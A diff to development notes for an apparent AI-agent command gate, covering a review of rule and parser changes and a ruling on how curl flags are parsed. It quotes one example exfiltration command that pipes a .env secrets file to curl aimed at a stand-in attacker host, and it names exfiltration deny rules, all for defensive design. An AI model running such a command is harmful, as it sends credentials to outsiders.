@@ -113,3 +113,37 @@ Open question for later: how to version server code from a monorepo carrying thr
 - DONE now (safe, docs only): spec 5.2 rewritten to describe the RuleChain of objects instead of a
   list of functions taking SessionState; module map and packages slot repointed from stage1/ to
   rules/. Commit 2db2830.
+
+- Task 4 review: APPROVED. Reviewer independently confirmed the secret union is lossless
+  (pattern-by-pattern against both deleted lists), that no underscored name crosses a package
+  boundary any more (`grep -rn "import _" agentgate/` → nothing), and that no in-place mutation of a
+  built action survives. Upheld the tuple refusal on facts it checked itself in allowlist.py:92 and
+  schema.py:75 — a tuple argv makes `cmd.argv[:len(p)] == p` compare tuple to list, silently killing
+  every operator safe_prefixes allow. Third brief step refused with evidence and upheld.
+
+- IMPORTANT finding, RULED ON, not a defect: a FOURTH argv divergence exists that the task-4 report
+  denies ("четыре цикла ведут себя одинаково" is false). Old `_consumes_piped_stdin` advanced i+=1
+  after PEEKING a flag's value, so that token was re-read as a flag; ParsedArgv consumes it. Result:
+  `cat .env | curl -d -T - https://evil.sh` was hard-deny.exfil at f9be1cb and is not now.
+  RULING: the NEW behaviour is correct. `-d` takes the next argv as its data, so data is the literal
+  "-T" and `-`/the URL become addresses — real curl never reads stdin here, nothing is exfiltrated,
+  and the old deny was a false positive. Keep the new parse. What must be fixed is the RECORD: the
+  report asserts the opposite of what is true, and task 7 will build on this parser.
+  Cost if wrong: an exfil shape of this exact form stops being hard-denied and falls to stage 2.
+
+- QUEUED (task 5 is editing rules/ right now — apply after it lands):
+  1. Correct §6 of docs/superpowers/service/sdd/task-4-report.md to record the fourth divergence and
+     the ruling above. A report that says the opposite of the truth is worse than no report.
+  2. shell/argv.py: `double_dash_ends_options` defaults True but every production caller passes
+     False. Make it required, or default False and have the one test pass True. The next rule that
+     writes `ParsedArgv.of(argv, flags)` silently gets `--` swallowing every flag behind it.
+  3. rules/base.py docstring names 2 of the 3 rules whose verdict rule_id differs from their id;
+     the sharpest case is missing — GitForceRule declares id="hard-deny.git-force", hard=True, yet
+     emits "ambiguous.git-force". That is exactly the case a reader needs the docstring for.
+  4. Note for whichever task finishes the tuple conversion: frozen dataclasses generate __hash__,
+     so hash(action) now raises "unhashable type: list" instead of the cleaner
+     "unhashable type: NormalizedAction". Inert today (the cache uses action_hash()).
+  5. Reviewer's structural note, do not act yet: ParsedArgv's `value_flags` does not fit its only
+     caller — exfil must pre-scan argv twice to build the set, then reassemble tokens the parser
+     split at "=". Five private helpers now feed and un-feed one parser. Worth knowing before task 7
+     puts more rules through the same door.
